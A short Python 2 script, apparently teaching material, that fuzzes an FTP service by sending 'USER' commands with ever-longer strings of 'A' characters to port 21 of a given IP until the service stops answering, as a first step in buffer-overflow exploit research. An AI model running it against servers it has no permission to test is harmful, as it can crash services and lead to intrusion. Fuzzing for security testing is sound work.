#!/usr/bin/env python
'''
fuzzer:
When performing exploit research and development ,
it is very useful to leverage a scripting language to
send in varying amounts of input to try to cause an application to crash.
Python can be very useful to spinning up a quick script to
repeatedly connect to a service and send in varying amounts of input.
'''
import sys
import socket
from time import sleep
# set first argument given at CLI to 'target' variable
target = sys.argv[1]
# create string of 50 A's '\x41'
#生成50个A，41是‘A’的16进制ascii码
buff = '\x41'*50
#  每次向目标IP地址的21端口发送50个‘A'
# loop through sending in a buffer with an increasing length by 50 A's
while True:
  # The "try - except" catches the programs error and takes our defined action
    try:
    # Make a connection to target system on TCP/21
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((target, 21))
        s.recv(1024)
        print "Sending buffer with length: "+str(len(buff))
        # Send in string 'USER' + the string 'buff'
        s.send("USER "+buff+"\r\n")
        s.close()
        sleep(1)
        # Increase the buff string by 50 A's and then the loop continues
        buff = buff + '\x41'*50
    except:  # If we fail to connect to the server, we assume its crashed and print the statement below
        print "[+] Crash occured with buffer length: "+str(len(buff)-50)
        sys.exit()
